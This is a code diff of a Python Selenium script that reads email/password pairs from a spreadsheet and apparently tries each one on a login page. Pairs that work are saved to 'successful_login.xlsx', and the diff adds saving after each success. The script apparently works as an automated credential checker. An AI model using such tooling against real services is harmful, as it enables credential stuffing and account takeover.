@@ -3,6 +3,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.service import Service
 from openpyxl import load_workbook, Workbook
 import time
+import sys
 
 # Load Excel
 wb = load_workbook("credentials.xlsx")
@@ -56,6 +57,7 @@ for row in sheet.iter_rows(min_row=2, values_only=True):
         if "messaging" in driver.current_url.lower():
             print(f"✅ Success: {email}")
             output_ws.append([email, password])
+            output_wb.save("successful_login.xlsx")  # Save after each success
         else:
             print(f"❌ Failed: {email}")
 
@@ -64,5 +66,5 @@ for row in sheet.iter_rows(min_row=2, values_only=True):
     finally:
         driver.quit()  # Always close the browser
 
-# Save valid emails
-output_wb.save("successful_logins.xlsx")
+print("✅ All emails processed. Results saved in successful_login.xlsx.")
+sys.exit(0)
